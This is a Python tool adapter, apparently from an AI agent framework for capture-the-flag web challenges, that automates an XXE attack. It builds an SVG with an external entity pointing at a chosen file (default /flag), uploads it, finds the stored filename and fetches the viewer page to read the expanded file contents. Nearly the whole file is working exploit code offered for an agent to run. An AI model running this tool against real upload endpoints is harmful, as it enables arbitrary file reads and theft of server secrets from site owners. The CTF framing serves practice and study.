"""XXE 文件读取适配器：生成 XXE SVG payload + 上传并读取结果（web 上传类题）。

复盘来源：10664 UploadKing —— SVG 上传（白名单含 .svg），服务端解析 XML 展开实体，
view.php 读取时返回实体内容 = 任意文件读取。封装为可复用工具。

用法（主 Agent plan）：
    {"tool": "xxe_file_read",
     "url": "http://target/upload.php",        # 上传接口
     "read_url": "http://target/view.php?file=", # 读取接口（前缀，追加文件名）
     "target_file": "/flag"}                    # 要读的文件
"""

from __future__ import annotations

import re
from typing import Optional

from tools.base import ToolAdapter, ToolOutput

XXE_SVG_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{target}">]>\n'
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
    '<text x="10" y="20">&xxe;</text>\n</svg>'
)


class XxeFileReadAdapter(ToolAdapter):
    """XXE SVG 任意文件读取（上传类 web 题）。"""

    name = "xxe_file_read"
    categories = ["web"]

    def __init__(self, sandbox=None, timeout: float = 15.0) -> None:
        super().__init__(sandbox)
        self.timeout = timeout

    async def run(self, params: dict) -> ToolOutput:
        import httpx

        upload_url = str(params.get("url") or "").strip()
        read_url = str(params.get("read_url") or "").strip()
        target = str(params.get("target_file") or "/flag").strip()
        if not upload_url:
            return ToolOutput(text="缺少上传接口 url", ok=False)

        # 1. 生成 XXE SVG
        svg = XXE_SVG_TEMPLATE.format(target=target)
        try:
            async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True, trust_env=False) as client:
                # 2. 上传
                resp = await client.post(
                    upload_url,
                    files={"file": ("xxe_probe.svg", svg.encode(), "image/svg+xml")},
                )
                # 3. 从响应/管理页提取上传后的文件名
                fname = None
                m = re.search(r"(upload_[0-9a-f_]+\.svg)", resp.text)
                if m:
                    fname = m.group(1)
                else:
                    # 尝试从 read_url 指向的管理页提取
                    if read_url:
                        list_resp = await client.get(read_url)
                        m2 = re.search(r"(upload_[0-9a-f_]+\.svg)", list_resp.text)
                        if m2:
                            fname = m2.group(1)
                if not fname:
                    return ToolOutput(
                        text=f"[XXE] 上传成功但未找到文件名（响应含 XXE 实体内容？）:\n{resp.text[:300]}",
                        raw=resp.text, ok=False,
                    )
                # 4. 读取文件（实体展开）
                if read_url:
                    read_resp = await client.get(read_url + fname)
                    body = read_resp.text
                else:
                    body = resp.text
        except Exception as exc:  # noqa: BLE001 - 网络异常兜底
            return ToolOutput(text=f"[XXE] 请求失败 {type(exc).__name__}: {exc}", ok=False)

        # 输出过滤：提取实体展开后的内容（读文件结果）
        text = body
        if "&xxe;" in body and target not in body:
            return ToolOutput(text="[XXE] 实体未展开（服务端不解析 XML），尝试其他文件/路径", raw=body, ok=False)
        return ToolOutput(text=text[:800], raw=body, ok=True)
